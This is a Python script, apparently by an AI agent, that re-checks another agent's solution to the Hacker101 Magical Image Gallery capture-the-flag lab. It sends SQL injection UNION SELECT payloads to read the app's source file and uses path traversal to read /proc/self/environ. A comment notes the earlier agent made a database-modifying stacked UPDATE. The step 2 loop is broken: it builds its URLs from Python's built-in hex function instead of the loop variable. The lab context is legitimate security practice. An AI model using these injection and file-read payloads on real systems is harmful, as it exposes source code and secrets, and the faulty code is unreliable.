#!/usr/bin/env python3
"""Independent verification of another agent's Hacker101 Magical Image Gallery solution."""
import re
import urllib.error
import urllib.request

BASE = "https://f69716e4ca42fa5db261fc835d4fddee.ctf.hacker101.com"


def get(path, timeout=12):
    try:
        with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
            return r.getcode(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


def show(label, code, body):
    text = body.decode("utf-8", "replace")
    print(f"\n=== {label} -> HTTP {code} ({len(body)} bytes) ===")
    flags = re.findall(r"\^FLAG\^[0-9a-f]+\$FLAG\$", text)
    if flags:
        print("  FLAGS FOUND:", flags)
    print("  head:", " ".join(text.split())[:300])
    if "FLAGS" in text:
        m = re.search(r"FLAGS=\[.{0,400}", text)
        if m:
            print("  footnote hit:", m.group(0)[:400])


# 1) Did the previous agent's stacked UPDATE persist? Just GET / and look at the footer.
code, body = get("/")
show("GET / (footer env check)", code, body)

# 2) The reported UNION read of main.py (hex 'main.py' and '../main.py')
for hexv, note in [
    ("6d61696e2e7079", "hex 'main.py'"),
    ("2e2e2f6d61696e2e7079", "hex '../main.py'"),
    ("2e2f6d61696e2e7079", "hex './main.py'"),
]:
    code, body = get(f"/fetch?id=-1+UNION+SELECT+0x{hex}--%20")
    show(f"UNION SELECT 0x{hex} ({note})", code, body)

# 3) try quoted-string variant
code, body = get("/fetch?id=-1+UNION+SELECT+%27../main.py%27--%20")
show("UNION SELECT '../main.py'", code, body)

# 4) read /proc/self/environ via traversal (read-only env check, no DB mutation)
for hex in [
    "2e2e2f2e2e2f2e2e2f2e2e2f70726f632f73656c662f656e7669726f6e",  # ../../../../proc/self/environ
    "2f70726f632f73656c662f656e7669726f6e",  # /proc/self/environ
]:
    code, body = get(f"/fetch?id=-1+UNION+SELECT+0x{hex}--%20")
    show(f"UNION SELECT 0x{hex}", code, body)